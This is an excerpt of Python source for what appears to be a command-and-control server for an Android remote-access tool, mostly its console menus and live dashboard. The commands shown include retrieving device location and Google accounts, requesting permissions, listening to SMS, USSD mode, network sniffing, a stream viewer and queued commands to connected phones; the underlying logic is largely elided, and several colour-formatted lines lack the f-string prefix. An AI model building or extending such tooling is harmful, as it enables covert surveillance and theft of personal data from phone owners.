        print("  get_location                   Retrieve device location")

    # ACCOUNTS
        print("\n[ACCOUNTS]")
        print("  get_accounts                   Retrieve Google accounts")

    # PERMISSIONS
        print("\n[PERMISSIONS]")
        print("  permissions                    List permissions and status")
        print("  request <permission>           Request a specific permission")

    # MISC
        print("\n[MISC]")
        print("  monitor                        Enter live monitoring mode")
        print("  sniff<num>                     Network sniff (example: sniff30)")
    ...
    def show_command_prompt(self):
        print("\n" + "=" * 60)
        print("[{MAGENTA}phone{RESET}] DEVICE COMMAND SERVER - COMMAND MODE")
        print("=" * 60)
        print("[{GREEN}info{RESET}] Type 'help' for available commands")
        print("[{GREEN}info{RESET}] Type 'monitor' to enter monitoring mode")
        print("[{GREEN}info{RESET}] Type 'ussd' to enter USSD mode")
        print("[{GREEN}info{RESET}] Type 'listen-sms' to enter SMS listening mode")
        print("[{GREEN}info{RESET}] Type 'start_stream_viewer' to start the stream viewer")
        print("=" * 60)
        self.show_prompt()
    ...
    def display_data_table(self):
        ...
        while self.running:
            ...
            if current_time - last_update >= update_interval:
                ...
                print("=" * 80)
                print(f"[{MAGENTA}phone{RESET}] DEVICE MONITOR SERVER - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                print(f"[{GREEN}globe{RESET}] Server: http://{self.get_local_ip()}:{self.port}")
                print("=" * 80)
                print("[{GREEN}info{RESET}] Commands: [w] Vibrate All Devices | [exit] Return to Command Mode | [h] Help")
                print("=" * 80)

                if not self.connected_devices:
                    print("\n[{RED}error{RESET}] No devices connected")
                    print(f"\n🔌 Waiting for Android device to connect to:")
                    print(f"   [{GREEN}location{RESET}] http://{self.get_local_ip()}:{self.port}")
                    time.sleep(2)
                    continue

                print(f"[{BLUE}wifi{RESET}] Connected devices: {len(self.connected_devices)}")
                for device_id, device_info in self.connected_devices.items():
                    connect_time = device_info['connected_at']
                    last_seen = device_info['last_seen']
                    duration = datetime.now() - connect_time
                    ...
                    cmd_info = f" | [{MAGENTA}mail{RESET}] {pending_commands} pending cmd(s)" if pending_commands > 0 else ""
                ...
                for device_id, device_info in self.device_data.items():
                    ...
                    print(f"[{YELLOW}chart{RESET}] DATA FROM DEVICE: {device_id}")
                    print("-" * 40)
                    ...
                    if categories['device']:
                        print("[{MAGENTA}phone{RESET}] DEVICE INFORMATION")
                        print("-" * 40)
                    ...
                    if categories['battery']:
                        print("[{YELLOW}battery{RESET}] BATTERY INFORMATION")
                        print("-" * 40)
                    ...
                    if categories['sensor']:
                        print("[{YELLOW}chart{RESET}] SENSOR INFORMATION")
                        print("-" * 40)
                        ...
                        if compass_data:
                            print("  [{BLUE}compass{RESET}] COMPASS:")
                        ...
                        if other_sensor_data:
                            print("  [{GREEN}antenna{RESET}] OTHER SENSORS:")
                    ...
                    if categories['bluetooth']:
                        print("[{BLUE}wifi{RESET}] BLUETOOTH INFORMATION")
                        print("-" * 40)
                    ...
                    if categories['action']:
                        print("[{RED}bolt{RESET}] RECENT ACTIONS")
                        print("-" * 40)
                    ...
                    if categories['other']:
                        print("[{GREEN}note{RESET}] OTHER INFORMATION")
                        print("-" * 40)
                ...
                print("\n[{GREEN}info{RESET}] Type 'exit' to return to command mode")
    ...
    def start(self):
        ...
        print(f"[{GREEN}ok{RESET}] Server started successfully!")
        print(f"[{GREEN}globe{RESET}] Local Network: http://{local_ip}:{self.port}")
        print(f"[{GREEN}link{RESET}] All Interfaces: http://{self.host}:{self.port}")
        print("[{MAGENTA}phone{RESET}] Configure your Android app with this URL")
        ...
        try:
            while self.running:
                if self.waiting_for_sms_conversation and time.time() > self.sms_conversation_timeout:
                    print("\n[{YELLOW}timer{RESET}] Timeout waiting for SMS conversation data")
                    self.waiting_for_sms_conversation = False
                    self.sms_conversation_sender = ""
                    self.show_prompt()
    ...
    def run_flask(self):
        try:
            ...
            if "Address already in use" in str(e):
                print(f"[{RED}error{RESET}] Error: Port {self.port} is already in use!")
                print("[{GREEN}info{RESET}] Try using a different port or stop the existing server.")
            else:
                print(f"[{RED}error{RESET}] Network error: {e}")
            self.stop()
        except Exception as e:
            print(f"[{RED}error{RESET}] Server error: {e}")
            self.stop()
    ...
    def stop(self):
        ...
        print("[{GREEN}ok{RESET}] Server stopped gracefully")
        sys.exit(0)
